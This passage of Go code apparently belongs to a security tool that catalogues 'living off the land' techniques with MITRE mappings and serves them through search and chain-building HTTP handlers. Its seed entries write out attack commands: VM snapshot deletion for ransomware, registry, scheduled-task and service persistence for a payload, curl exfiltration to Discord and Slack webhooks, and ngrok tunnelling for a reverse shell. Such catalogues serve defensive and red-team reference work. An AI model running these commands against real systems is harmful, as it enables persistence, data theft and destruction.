		{ID: "esxi-vim-cmd", ProjectID: "lolesxi", Name: "vim-cmd", Description: "vSphere Management command for VM operations", Platform: "esxi", Category: "execution", MitreIDs: []string{"T1059"}, Commands: []LOLCommand{{Command: "vim-cmd vmsvc/getallvms", Description: "List all registered VMs", Usecase: "VM enumeration", Category: "Recon"}, {Command: "vim-cmd vmsvc/snapshot.removeall VMID", Description: "Remove all VM snapshots", Usecase: "Snapshot destruction (ransomware)", Category: "Impact"}}, Tags: []string{"esxi", "vmware", "LOLESXi"}},
	}

	// LOLRMM entries
	rmmEntries := []LOLEntry{
		{ID: "rmm-anydesk", ProjectID: "lolrmm", Name: "AnyDesk", Description: "Remote desktop application commonly abused for unauthorized access", Platform: "cross", Category: "rmm", MitreIDs: []string{"T1219"}, Commands: []LOLCommand{{Command: "AnyDesk.exe --set-password PASSWORD", Description: "Set unattended access password", Usecase: "Persistent remote access", Category: "Persistence"}}, Tags: []string{"rmm", "remote-access", "LOLRMM"}},
		{ID: "rmm-teamviewer", ProjectID: "lolrmm", Name: "TeamViewer", Description: "Remote support tool abused by threat actors", Platform: "cross", Category: "rmm", MitreIDs: []string{"T1219"}, Commands: []LOLCommand{{Command: "TeamViewer.exe", Description: "Establish remote access session", Usecase: "Covert remote access", Category: "Persistence"}}, Tags: []string{"rmm", "remote-access", "LOLRMM"}},
	}

	// Persistence Info entries
	persistEntries := []LOLEntry{
		{ID: "persist-runkey", ProjectID: "persistence", Name: "Registry Run Keys", Description: "Run and RunOnce registry keys for auto-start persistence", Platform: "windows", Category: "persistence", MitreIDs: []string{"T1547.001"}, Commands: []LOLCommand{{Command: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\payload.exe", Description: "Add Run key persistence", Usecase: "Autostart persistence", Category: "Persistence", Privileges: "User"}, {Command: "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\payload.exe", Description: "Add machine-wide Run key", Usecase: "Autostart persistence (all users)", Category: "Persistence", Privileges: "Admin"}}, Tags: []string{"persistence", "registry", "autostart"}},
		{ID: "persist-schtask", ProjectID: "persistence", Name: "Scheduled Tasks", Description: "Windows Task Scheduler for persistent execution", Platform: "windows", Category: "persistence", MitreIDs: []string{"T1053.005"}, Commands: []LOLCommand{{Command: "schtasks /create /sc onlogon /tn Updater /tr C:\\payload.exe", Description: "Create logon-triggered scheduled task", Usecase: "Persistence via scheduled task", Category: "Persistence"}}, Tags: []string{"persistence", "scheduled-task"}},
		{ID: "persist-service", ProjectID: "persistence", Name: "Windows Services", Description: "Create or modify services for persistence", Platform: "windows", Category: "persistence", MitreIDs: []string{"T1543.003"}, Commands: []LOLCommand{{Command: "sc create Updater binPath= C:\\payload.exe start= auto", Description: "Create auto-start service", Usecase: "Service-based persistence", Category: "Persistence", Privileges: "Admin"}}, Tags: []string{"persistence", "service"}},
	}

	// LOT Webhooks entries
	webhookEntries := []LOLEntry{
		{ID: "webhook-discord", ProjectID: "lot-webhooks", Name: "Discord Webhooks", Description: "Discord webhooks for data exfiltration", Platform: "cross", Category: "exfiltration", MitreIDs: []string{"T1567"}, Commands: []LOLCommand{{Command: "curl -X POST -H 'Content-Type: application/json' -d '{\"content\":\"DATA\"}' WEBHOOK_URL", Description: "Send data via Discord webhook", Usecase: "Data exfiltration", Category: "Exfiltration"}}, Tags: []string{"webhook", "exfiltration", "LOT"}},
		{ID: "webhook-slack", ProjectID: "lot-webhooks", Name: "Slack Webhooks", Description: "Slack incoming webhooks for C2 and exfiltration", Platform: "cross", Category: "exfiltration", MitreIDs: []string{"T1567"}, Commands: []LOLCommand{{Command: "curl -X POST -H 'Content-Type: application/json' -d '{\"text\":\"DATA\"}' WEBHOOK_URL", Description: "Send data via Slack webhook", Usecase: "Data exfiltration", Category: "Exfiltration"}}, Tags: []string{"webhook", "exfiltration", "LOT"}},
	}

	// LOT Tunnels entries
	tunnelEntries := []LOLEntry{
		{ID: "tunnel-ngrok", ProjectID: "lot-tunnels", Name: "ngrok", Description: "Secure introspectable tunnels to localhost — abused for C2 and exfil", Platform: "cross", Category: "tunneling", MitreIDs: []string{"T1572"}, Commands: []LOLCommand{{Command: "ngrok tcp 4444", Description: "Create TCP tunnel for reverse shell", Usecase: "Tunnel C2 traffic through ngrok", Category: "Tunneling"}}, Tags: []string{"tunnel", "c2", "LOT"}},
		{ID: "tunnel-cloudflared", ProjectID: "lot-tunnels", Name: "Cloudflare Tunnel", Description: "Cloudflare Argo tunnel used for covert C2", Platform: "cross", Category: "tunneling", MitreIDs: []string{"T1572"}, Commands: []LOLCommand{{Command: "cloudflared tunnel --url http://localhost:8080", Description: "Create Cloudflare tunnel", Usecase: "Tunnel C2 through Cloudflare", Category: "Tunneling"}}, Tags: []string{"tunnel", "c2", "cloudflare", "LOT"}},
	}

	lolCatalog.Lock()
	for _, p := range projects {
		lolCatalog.projects[p.ID] = p
	}
	allEntries := make([][]LOLEntry, 0)
	allEntries = append(allEntries, lolbasEntries, gtfoEntries, driverEntries, c2Entries, hijackEntries, loobinEntries, wadcomEntries, loladEntries, esxiEntries, rmmEntries, persistEntries, webhookEntries, tunnelEntries)
	for _, batch := range allEntries {
		for _, e := range batch {
			lolCatalog.entries[e.ID] = e
		}
	}
	lolCatalog.Unlock()
}

// ---- LOL HTTP Handlers ----

func handleLOLStats(w http.ResponseWriter, r *http.Request) {
	lolCatalog.RLock()
	defer lolCatalog.RUnlock()

	byProject := make(map[string]int)
	byPlatform := make(map[string]int)
	byCategory := make(map[string]int)
	mitreHeatmap := make(map[string]int)
	topBinaries := make([]string, 0)

	for _, e := range lolCatalog.entries {
		byProject[e.ProjectID]++
		byPlatform[e.Platform]++
		byCategory[e.Category]++
		for _, m := range e.MitreIDs {
			mitreHeatmap[m]++
		}
	}

	// top binaries by command count
	type binScore struct {
		name  string
		count int
	}
	scored := make([]binScore, 0)
	for _, e := range lolCatalog.entries {
		scored = append(scored, binScore{name: e.Name, count: len(e.Commands)})
	}
	// simple top-10 by command count
	for i := 0; i < len(scored) && i < 10; i++ {
		for j := i + 1; j < len(scored); j++ {
			if scored[j].count > scored[i].count {
				scored[i], scored[j] = scored[j], scored[i]
			}
		}
		topBinaries = append(topBinaries, scored[i].name)
	}

	stats := LOLStats{
		TotalProjects: len(lolCatalog.projects),
		TotalEntries:  len(lolCatalog.entries),
		ByProject:     byProject,
		ByPlatform:    byPlatform,
		ByCategory:    byCategory,
		MitreHeatmap:  mitreHeatmap,
		TopBinaries:   topBinaries,
	}

	writeJSON(w, http.StatusOK, stats)
}

func handleListLOLProjects(w http.ResponseWriter, r *http.Request) {
	lolCatalog.RLock()
	defer lolCatalog.RUnlock()

	items := make([]LOLProject, 0, len(lolCatalog.projects))
	for _, p := range lolCatalog.projects {
		items = append(items, p)
	}
	writeJSON(w, http.StatusOK, items)
}

func handleGetLOLProject(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")

	lolCatalog.RLock()
	p, ok := lolCatalog.projects[id]
	lolCatalog.RUnlock()

	if !ok {
		writeJSON(w, http.StatusNotFound, map[string]interface{}{"ok": false, "error": "project not found"})
		return
	}
	writeJSON(w, http.StatusOK, p)
}

func handleListLOLEntries(w http.ResponseWriter, r *http.Request) {
	projectID := r.URL.Query().Get("projectId")
	platform := r.URL.Query().Get("platform")
	category := r.URL.Query().Get("category")
	tag := r.URL.Query().Get("tag")
	mitreID := r.URL.Query().Get("mitreId")

	lolCatalog.RLock()
	defer lolCatalog.RUnlock()

	items := make([]LOLEntry, 0)
	for _, e := range lolCatalog.entries {
		if projectID != "" && e.ProjectID != projectID {
			continue
		}
		if platform != "" && e.Platform != platform {
			continue
		}
		if category != "" && e.Category != category {
			continue
		}
		if mitreID != "" {
			found := false
			for _, m := range e.MitreIDs {
				if m == mitreID {
					found = true
					break
				}
			}
			if !found {
				continue
			}
		}
		if tag != "" {
			found := false
			for _, t := range e.Tags {
				if strings.EqualFold(t, tag) {
					found = true
					break
				}
			}
			if !found {
				continue
			}
		}
		items = append(items, e)
	}
	writeJSON(w, http.StatusOK, items)
}

func handleGetLOLEntry(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")

	lolCatalog.RLock()
	e, ok := lolCatalog.entries[id]
	lolCatalog.RUnlock()

	if !ok {
		writeJSON(w, http.StatusNotFound, map[string]interface{}{"ok": false, "error": "entry not found"})
		return
	}
	writeJSON(w, http.StatusOK, e)
}

func handleSearchLOL(w http.ResponseWriter, r *http.Request) {
	query := strings.ToLower(r.URL.Query().Get("q"))
	if query == "" {
		writeJSON(w, http.StatusBadRequest, map[string]interface{}{"ok": false, "error": "query parameter 'q' required"})
		return
	}

	lolCatalog.RLock()
	defer lolCatalog.RUnlock()

	results := make([]LOLEntry, 0)
	for _, e := range lolCatalog.entries {
		if strings.Contains(strings.ToLower(e.Name), query) ||
			strings.Contains(strings.ToLower(e.Description), query) {
			results = append(results, e)
			continue
		}
		// search commands
		for _, cmd := range e.Commands {
			if strings.Contains(strings.ToLower(cmd.Command), query) ||
				strings.Contains(strings.ToLower(cmd.Description), query) {
				results = append(results, e)
				break
			}
		}
	}

	// also match tags
	for _, e := range lolCatalog.entries {
		already := false
		for _, r := range results {
			if r.ID == e.ID {
				already = true
				break
			}
		}
		if already {
			continue
		}
		for _, t := range e.Tags {
			if strings.Contains(strings.ToLower(t), query) {
				results = append(results, e)
				break
			}
		}
	}

	writeJSON(w, http.StatusOK, map[string]interface{}{"ok": true, "results": results, "count": len(results)})
}

func handleLOLByMitre(w http.ResponseWriter, r *http.Request) {
	lolCatalog.RLock()
	defer lolCatalog.RUnlock()

	// group entries by MITRE technique
	grouped := make(map[string][]LOLEntry)
	for _, e := range lolCatalog.entries {
		for _, m := range e.MitreIDs {
			grouped[m] = append(grouped[m], e)
		}
	}
	writeJSON(w, http.StatusOK, grouped)
}

// ---- LOL Chain Handlers ----

func handleListLOLChains(w http.ResponseWriter, r *http.Request) {
	lolCatalog.RLock()
	defer lolCatalog.RUnlock()

	items := make([]LOLChain, 0, len(lolCatalog.chains))
	for _, ch := range lolCatalog.chains {
		items = append(items, ch)
	}
	writeJSON(w, http.StatusOK, items)
}

func handleCreateLOLChain(w http.ResponseWriter, r *http.Request) {
	var ch LOLChain
	if err := json.NewDecoder(r.Body).Decode(&ch); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]interface{}{"ok": false, "error": "invalid body"})
		return
	}

	ch.ID = genC2ID("lolchain")
	ch.CreatedAt = time.Now().Format(time.RFC3339)
	if ch.Steps == nil {
		ch.Steps = []LOLChainStep{}
	}
	for i := range ch.Steps {
		ch.Steps[i].Order = i + 1
	}
	if ch.MitreTactics == nil {
		ch.MitreTactics = []string{}
	}

	lolCatalog.Lock()
	lolCatalog.chains[ch.ID] = ch
	lolCatalog.Unlock()

	writeJSON(w, http.StatusCreated, map[string]interface{}{"ok": true, "chain": ch})
}

func handleGetLOLChain(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")

	lolCatalog.RLock()
	ch, ok := lolCatalog.chains[id]
	lolCatalog.RUnlock()

	if !ok {
		writeJSON(w, http.StatusNotFound, map[string]interface{}{"ok": false, "error": "chain not found"})
		return
	}
	writeJSON(w, http.StatusOK, ch)
}

func handleDeleteLOLChain(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")

	lolCatalog.Lock()
	if _, ok := lolCatalog.chains[id]; !ok {
		lolCatalog.Unlock()
		writeJSON(w, http.StatusNotFound, map[string]interface{}{"ok": false, "error": "chain not found"})
		return
	}
	delete(lolCatalog.chains, id)
	lolCatalog.Unlock()

	writeJSON(w, http.StatusOK, map[string]interface{}{"ok": true})
}

// handleAddLOLEntry allows users to add custom entries to the catalog
func handleAddLOLEntry(w http.ResponseWriter, r *http.Request) {
	var e LOLEntry
	if err := json.NewDecoder(r.Body).Decode(&e); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]interface{}{"ok": false, "error": "invalid body"})
		return
	}

	if e.ID == "" {
		e.ID = genC2ID("custom")
	}
	if e.MitreIDs == nil {
		e.MitreIDs = []string{}
	}
	if e.Commands == nil {
		e.Commands = []LOLCommand{}
	}
	if e.Tags == nil {
		e.Tags = []string{}
	}

	lolCatalog.Lock()
	lolCatalog.entries[e.ID] = e
	lolCatalog.Unlock()

	writeJSON(w, http.StatusCreated, map[string]interface{}{"ok": true, "entry": e})
}
